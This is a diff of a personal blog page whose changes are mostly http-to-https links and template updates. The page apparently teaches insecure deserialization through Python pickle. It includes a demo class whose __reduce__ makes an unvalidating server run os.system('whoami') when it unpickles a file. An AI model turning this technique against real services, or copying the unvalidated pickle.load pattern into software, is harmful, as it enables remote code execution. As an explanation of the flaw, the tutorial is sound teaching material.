@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html lang="en" data-theme="light"><head>
     <title> Shibin B Shaji | Using Pythons Pickling to Explain Insecure Deserialization </title>
-    <meta charset="utf-8"><meta name="generator" content="Hugo 0.69.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.118.2"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
     <meta name="description" content="Script kiddie | Full Stack Developer | Designer | Gamer">
     
-    <link rel="stylesheet" href="http://shibinbshaji.com/css/style.min.dc0a9303e7e14980d5b3649f68dba0679d003b7a03c56e1a9392ef72c3e0be55.css" integrity="sha256-3AqTA&#43;fhSYDVs2SfaNugZ50AO3oDxW4ak5LvcsPgvlU=" type="text/css">
+    <link rel="stylesheet" href="https://shibinbshaji.com/css/style.min.3bc3fa35d9e84b19ef733119c6a0250df66531652a664b5e59e9d5fe0c37142e.css" integrity="sha256-O8P6NdnoSxnvczEZxqAlDfZlMWUqZkteWenV/gw3FC4=" type="text/css">
     
     <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
-    <base href="http://shibinbshaji.com">
+    <base href="https://shibinbshaji.com">
     
-    <link rel="shortcut icon" href="http://shibinbshaji.com/favicons/favicon.ico" type="image/x-icon">
-    <link rel="apple-touch-icon" sizes="180x180" href="http://shibinbshaji.com/favicons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="http://shibinbshaji.com/favicons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="http://shibinbshaji.com/favicons/favicon-16x16.png">
-    <link rel="canonical" href="http://shibinbshaji.com/posts/using-pythons-pickling-to-explain-insecure-deserialization/">
+    <link rel="shortcut icon" href="https://shibinbshaji.com/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shibinbshaji.com/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shibinbshaji.com/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shibinbshaji.com/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://shibinbshaji.com/posts/using-pythons-pickling-to-explain-insecure-deserialization/">
     
     
-    <script type="text/javascript" src="http://shibinbshaji.com/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM="></script>
+    <script type="text/javascript" src="https://shibinbshaji.com/js/anatole-header.min.ed912806a856a21a5e5ded5fc93e811a3266f4cff7026a0897794ada2980d487.js" integrity="sha256-7ZEoBqhWohpeXe1fyT6BGjJm9M/3AmoIl3lK2imA1Ic="></script>
 
 
         <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
@@ -68,7 +68,7 @@ body { background: black }
 <div class="sidebar animated fadeInDown">
     <div class="logo-title">
       <div class="title">
-        <img src="http://shibinbshaji.com/images/profile.jpg" alt="profile picture">
+        <img src="https://shibinbshaji.com/images/profile.jpg" alt="profile picture">
         <h3 title=""><a href="/">&lt; SHIBIN B SHAJI /&gt;<span class="blink"></span></a></h3>
         <div class="description">
           <p>Script kiddie | Full Stack Developer | Designer | Gamer</p>
@@ -121,7 +121,7 @@ body { background: black }
         
     </ul>
     <div class="footer">
-        <div class="by_farbox">&copy; Shibin B Shaji 2022 </div>
+        <div class="by_farbox">&copy; Shibin B Shaji 2023 </div>
       </div>
     </div>
 </div>
@@ -136,9 +136,6 @@ body { background: black }
         
         
         <li><a  href="/posts/" title="">Posts</a></li>
-        
-        
-        <li><a  href="/bug-bounty/" title="">Bug Bounty</a></li>
         
         
         <li><a  href="/notes/" title="">Notes</a></li>
@@ -175,73 +172,73 @@ body { background: black }
 <p><strong>Deserialization</strong> is the process of converting serialized data in bytes to readable format.</p>
 <p>Allow me to demonstrate.</p>
 <p>We will be using a library called pickle in python. If you have a terminal up and running, type the following commands.</p>
-<pre><code>python3
+<pre tabindex="0"><code>python3
 </code></pre><p>This will open a Python3 interactive session in the terminal. Now import the pickle library.</p>
-<pre><code>&gt;&gt;&gt;import pickle
+<pre tabindex="0"><code>&gt;&gt;&gt;import pickle
 </code></pre><p>Next, define an object.</p>
-<pre><code>&gt;&gt;&gt;example = { &quot;name&quot; : &quot;Shibin&quot; , &quot;position&quot; : &quot;sec engineer&quot; }
+<pre tabindex="0"><code>&gt;&gt;&gt;example = { &#34;name&#34; : &#34;Shibin&#34; , &#34;position&#34; : &#34;sec engineer&#34; }
 </code></pre><p>Now that we have defined our object we will pickle (serialize) it. There are a lot of functions in the pickle library whose documentation can be found here. But here, we will be using only two functions from that library — <strong>dumps()</strong> and <strong>loads()</strong>.</p>
 <p><strong>pickle.dumps()</strong> is used to pickle (serialize) the data and it takes a variable, function or class to be pickled as its argument.</p>
 <p><strong>pickle.loads()</strong> is used to unpickle (deserialize) the data and takes a variable containing byte stream as a valid arguement.</p>
 <p>Let’s pickle the object that we have.</p>
-<pre><code>&gt;&gt;&gt;pickle.dumps(example)
+<pre tabindex="0"><code>&gt;&gt;&gt;pickle.dumps(example)
 </code></pre><p>This will pickle the data and the output will look somewhat like this:</p>
-<pre><code>b'\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.'
+<pre tabindex="0"><code>b&#39;\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.&#39;
 </code></pre><p>Now to use loads(),</p>
-<pre><code>&gt;&gt;&gt;pickle.loads(b'\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.')
+<pre tabindex="0"><code>&gt;&gt;&gt;pickle.loads(b&#39;\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.&#39;)
 </code></pre><p>which will give us the data back.</p>
-<pre><code>{'name': 'Shibin', 'position': 'sec engineer'}
+<pre tabindex="0"><code>{&#39;name&#39;: &#39;Shibin&#39;, &#39;position&#39;: &#39;sec engineer&#39;}
 </code></pre><hr>
 <p>Now you might be wondering how this can potentially be a threat to be listed in <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10 vulnerabilities</a>. Insecure deserialization is when an app deserializes the data that it gets without any kind of validation, or even the authenticity of the data.</p>
 <p>Again, allow me to demonstrate.</p>
 <p>Consider that there is a (shady) Python app which has both server side(server.py) and client side(client.py). The client will pickle some data and send it over to the server and the server will unpickle the data and display it.</p>
 <p>The script for <strong>client.py</strong> is:</p>
-<pre><code>import os
+<pre tabindex="0"><code>import os
 import pickle
 def serialize_exploit():
-      name = {&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
-      f = open(&quot;demo.pickle&quot;,&quot;wb&quot;)
+      name = {&#34;name&#34;:&#34;shibin&#34;,&#34;pos&#34;:&#34;sec Engineer&#34;}
+      f = open(&#34;demo.pickle&#34;,&#34;wb&#34;)
       safecode = pickle.dump(name,f)  ######
       return safecode
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
       safecode = serialize_exploit()
 </code></pre><p>(Hmm. Shady app indeed, why does it import the os library!?!?!) The script has a function serialize_exploit() which defines an object called name. Then a file called demo.pickle is opened for writing in binary format after which <strong>dump()</strong> (not dumps()) is used to pickle the object name and write into the file.</p>
 <p>Run the client with python3.</p>
-<pre><code>&gt;&gt;&gt;python3 client.py
+<pre tabindex="0"><code>&gt;&gt;&gt;python3 client.py
 </code></pre><p>The pickled data is written into the file demo.pickle. Printing the file using cat will show:</p>
-<pre><code>&gt;&gt;&gt;?}q(XnameqXshibinqXposqX
+<pre tabindex="0"><code>&gt;&gt;&gt;?}q(XnameqXshibinqXposqX
                         sec Engineerqu.%
 </code></pre><p>The script for <strong>server.py</strong> is:</p>
-<pre><code>import os
+<pre tabindex="0"><code>import os
 import pickle
 def insecure_deserialization():
-      f = open(&quot;demo.pickle&quot;,&quot;rb&quot;)
+      f = open(&#34;demo.pickle&#34;,&#34;rb&#34;)
       na = pickle.load(f)
       return na
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
       print(insecure_deserialization())
 </code></pre><p>This script has a function called <code>insecure_deserialization()</code> which opens the file demo.pickle to read the data in binary format. The function <strong>load()</strong> (not loads()) will read the data and unpickle. This data is then printed.</p>
 <p>Run the server with python3.</p>
-<pre><code>&gt;&gt;&gt;python3 server.py
+<pre tabindex="0"><code>&gt;&gt;&gt;python3 server.py
 </code></pre><p>It will print the data</p>
-<pre><code>&gt;&gt;&gt;{&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
+<pre tabindex="0"><code>&gt;&gt;&gt;{&#34;name&#34;:&#34;shibin&#34;,&#34;pos&#34;:&#34;sec Engineer&#34;}
 </code></pre><p>So in short, the client will pickle (serialise) some data and the server, without even validating the data it got, unpickles (deserializes) the data.
 Now begins the interesting part.</p>
 <p>Let us focus on client.py. Since there is no validation whatsoever, it will pickle any data thrown at it. So lets try to modify the script <strong>client.py</strong> as shown below</p>
-<pre><code>import os
+<pre tabindex="0"><code>import os
 import pickle
 class ImVulnerable():                                 ###
       def __reduce__(self):                           ###
-            return(os.system,('whoami',))             ###
+            return(os.system,(&#39;whoami&#39;,))             ###
 def serialize_exploit():
-      name = {&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
-      f = open(&quot;demo.pickle&quot;,&quot;wb&quot;)
+      name = {&#34;name&#34;:&#34;shibin&#34;,&#34;pos&#34;:&#34;sec Engineer&#34;}
+      f = open(&#34;demo.pickle&#34;,&#34;wb&#34;)
       safecode = pickle.dump(ImVulnerable(),f)        ###
       return safecode
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
       safecode = serialize_exploit()
 </code></pre><p>The changes in lines are highlighted with hash symbols(###). We define a class <strong>ImVulnerable()</strong> and inside it is a function which returns a linux kernel command using the os library of python. This class is then passed as an argument to <strong>dump()</strong> which then, as you are familiar by now, pickles it and writes it into the file demo.pickle. The content in the file demo.pickle is now:</p>
-<pre><code>?cos
+<pre tabindex="0"><code>?cos
 system
 qXwhoamiq?qRq.%
 </code></pre><p>Note that we have not edited the file <strong>server.py</strong> till now. Now when I try to run the server file, it will read the demo.pickle file and then unpickles the data. This will reveal the linux kernel command instead of a text to print. The command ‘whoami’ is executed in the server script!!!!!!!</p>
@@ -276,14 +273,14 @@ qXwhoamiq?qRq.%
 
 
 
-<script type="text/javascript" src="http://shibinbshaji.com/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw="></script>
+<script type="text/javascript" src="https://shibinbshaji.com/js/jquery.min.e80d7e6008943348b2c88cd12f10e546083ff6a88f06b4afac7151b78886417e.js" integrity="sha256-6A1&#43;YAiUM0iyyIzRLxDlRgg/9qiPBrSvrHFRt4iGQX4="></script>
 
 
 
 
-<script type="text/javascript" src="http://shibinbshaji.com/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4="></script>
+<script type="text/javascript" src="https://shibinbshaji.com/js/bundle.min.3ebad6bf39b2e7c2f899d3ed9bc97e8c0c1ead7a1b57472e3387321f673b8077.js" integrity="sha256-PrrWvzmy58L4mdPtm8l&#43;jAwerXobV0cuM4cyH2c7gHc="></script>
 
-<script type="text/javascript" src="http://shibinbshaji.com/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro="></script>
+<script type="text/javascript" src="https://shibinbshaji.com/js/medium-zoom.min.e1c6918cbaa90022a5612f0bd71c7bf3be6d036614c5729cebfe14f7b91fa4bc.js" integrity="sha256-4caRjLqpACKlYS8L1xx7875tA2YUxXKc6/4U97kfpLw="></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
